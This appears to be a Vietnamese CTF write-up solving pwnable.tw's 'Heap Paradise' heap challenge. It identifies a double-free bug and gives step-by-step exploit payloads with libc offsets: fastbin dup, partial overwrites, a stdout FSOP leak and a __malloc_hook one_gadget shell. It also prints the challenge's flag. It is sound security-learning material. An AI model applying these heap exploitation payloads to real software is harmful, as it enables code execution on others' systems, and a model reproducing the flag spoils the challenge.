+++
title = 'Pwnable.tw - Heap Paradise'
date = 2026-09-18T22:02:05+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Heap Paradise

`nc chall.pwnable.tw 10308`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Heap Paradise/heap_paradise_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
FORTIFY:    Enabled
```

libc là glibc **2.23** nên **không có tcache**, chỉ fastbin / smallbin / unsorted bin / large bin. Binary stripped, menu chỉ 3 lựa chọn: Allocate, Free, Exit.

`sub_B49` đọc số: `__read_chk(0, buf, 23, 24)` rồi `atoll(buf)` trả `long long`.

`sub_BAA` ghi dữ liệu: `__read_chk(0, ptr, size, size)` đọc **đúng** `size` byte, byte cuối là `\n` thì thay bằng `\0`. Không overflow ở đây.

`sub_C8D` (Allocate):

```c
i = slot trống đầu tiên trong mảng global qword_202040[16]
size = atoll()
if ((uint64)size <= 0x78) {
    qword_202040[i] = malloc(size)
    sub_BAA(qword_202040[i], size)
}
```

`sub_D8D` (Free):

```c
idx = atoll()
if ((int64)idx <= 15)                  // SO SÁNH SIGNED -> cho index âm
    free(qword_202040[idx])            // KHÔNG null slot -> UAF + double free
```

#### Các bug

1. **`free()` không null con trỏ trong mảng** → UAF và double free (fastbin dup) thoải mái
2. **So sánh index kiểu signed** → index âm đọc/free trước mảng, tới tận `.got`; chain này không dùng tới
3. **Không có chức năng in dữ liệu người dùng** → không có primitive leak cổ điển

Full RELRO (không ghi GOT), PIE (không biết địa chỉ), NX, canary → phải đi đường heap thuần.

### 2. Khai thác

Không có print nên phải:

- dùng **fastbin double free** tạo chunk chồng chunk
- tận dụng **byte cao của các con trỏ đã nằm sẵn trong heap** (`fd` của chunk trong fastbin, `main_arena+88` của chunk unsorted) để **partial overwrite 1-2 byte thấp** của `fd`, hướng `malloc` về fake chunk trong **libc** mà không cần biết libc base
- biến `puts`/`printf` của chính chương trình thành máy leak bằng cách ghi fake `_IO_FILE` lên `_IO_2_1_stdout_`
- kết thúc bằng fastbin dup → `__malloc_hook` → one_gadget

Điều kiện tiên quyết của trick 2 byte: **`libc_base % 0x10000 == 0`**, khoảng 50% mỗi lần chạy. Lệch thì `malloc` pop nhánh sai → crash/EOF, cứ retry.

#### Các giá trị đo được

```js
one_gadget      0xef6c4      // ràng buộc [rsp+0x50] == NULL
_IO_2_1_stdin_  0x3c38e0
_IO_2_1_stdout_ 0x3c4620
__malloc_hook   0x3c3b10
main_arena      0x3c3b20     // unsorted chunk trỏ main_arena+88 = libc + 0x3c3b78
system          0x45390
```

#### Phase A - dựng fake unsorted chunk

Request `0x68` → chunk `0x70` (fastbin idx 5). `HB` = heap base.

1. `alloc(0x68)` #0 → chunk0 (user `HB+0x10`), `alloc(0x68)` #1 → chunk1 (user `HB+0x80`)
2. `free(0)`, `free(1)`, `free(0)` → double free hợp lệ vì gate fasttop thấy head là chunk1, khác chunk0. `fastbin[0x70] = [c0 → c1 → c0]`
3. `alloc(0x68, b'\x20')` #2 → trả c0, ghi 1 byte `0x20` đè byte thấp của `c0.fd` → fd trỏ tới `HB+0x20` (chính là header c0)
4. `alloc(0x68)` #3 → c1; #4 → c0, ghi `p64(0)*2+p64(0)+p64(0x71)` để fake chunk tại `HB+0x20` có **size `0x71`**
5. `alloc(0x68)` #5 → pop fake chunk `HB+0x20`, trả user `HB+0x30`, chồng lên chunk0
6. `free(0)`; `alloc(0x68, p64(0)*3+p64(0xA1))` #6 → trả c0, ghi fake size `0xA1` vào header fake chunk
7. `free(5)` → free fake chunk size `0xA1` (real size `0xA0`) vào **unsorted bin**

Verify bằng `bins`:

```text
unsortedbin all: 0x...6030 → main_arena+88
```

#### Phase B - leak bằng FSOP trên stdout

1. `free(0); free(1)` → `fastbin[0x70] = [c1 → c0]`
2. `alloc(0x78, b'\x00'*0x40 + p64(0) + p64(0x71) + b'\xa0')` #7 → request `0x78` được cấp từ fake chunk unsorted (split): user `HB+0x30`, remainder `HB+0xA0` về unsorted. Payload ghi đè header chunk1 và byte thấp `0xa0` lên `fd` của chunk1
3. `free(7)` → chunk `0x80` vào `fastbin[0x80]`
4. `alloc(0x68, b'\x00'*0x20 + p64(0) + p64(0x71) + p64(_IO_2_1_stdout_ - 0x43)[:2])` #8 → trả c1; ghi `c1.fd = 0`, dựng header remainder hợp lệ cho bin 0x70, và **ghi 2 byte thấp** `0x45dd` lên `remainder.fd` (đang là `main_arena+88 = libc+0x3c3b78`). Vì `libc_base % 0x10000 == 0` nên low16 là `0x3b78`, sau overwrite thành `libc_base + 0x3c45dd = _IO_2_1_stdout_ - 0x43`
5. `alloc(0x68, b'\n')` #9 → pop `0xa0`; head fastbin giờ là `_IO_2_1_stdout_ - 0x43`
6. `alloc(0x68, b'\x00'*0x33 + p64(0xfbad1887) + p64(0)*3 + b'\x88')` #10 → pop `_IO_2_1_stdout_-0x43`; trường size tại `-0x3b` trong libc là byte `0x7f` nên `fastbin_index == 5` hợp lệ; `malloc` trả user `_IO_2_1_stdout_ - 0x33`. Payload set `flags = 0xfbad1887`, zero `_IO_read_ptr/_end/_base`, và nâng byte thấp `_IO_write_ptr` thành `0x88`
7. Lần `puts`/`printf` của menu kế tiếp flush `_IO_write_base.._IO_write_ptr` → dump bộ nhớ, **8 byte đầu là `_IO_2_1_stdout_._chain` = `_IO_2_1_stdin_`**

```js
libc_base = leak_chain - 0x3c38e0
```

```bash
[+] _IO_2_1_stdin_ leak: 0x7f4f8e7338e0
[+] libc base: 0x7f4f8e370000
```

#### Phase C - fastbin dup → `__malloc_hook` → one_gadget

Lặp lại pattern double free (`free(0); free(1); free(0)`):

1. `alloc(0x68, p64(__malloc_hook - 0x23))` #11 → trả c0, ghi `fd = __malloc_hook - 0x23`
2. `alloc(0x68, '\n')` #12 → c1; `alloc(0x68, '\n')` #13 → c0, head giờ là `__malloc_hook - 0x23`
3. `alloc(0x68, b'\x00'*0x13 + p64(one_gadget))` #14 → pop fake chunk trong libc (size `0x7f` tại `__malloc_hook-0x1b`), trả user `__malloc_hook - 0x13`, ghi pad `0x13` + one_gadget → `__malloc_hook = one_gadget`
4. Trigger: menu `1`, Size `1` → `malloc(1)` gọi `__malloc_hook` → `execve("/bin/sh")`

`FLAG: FLAG{W3lc0m3_2_h3ap_p4radis3}`
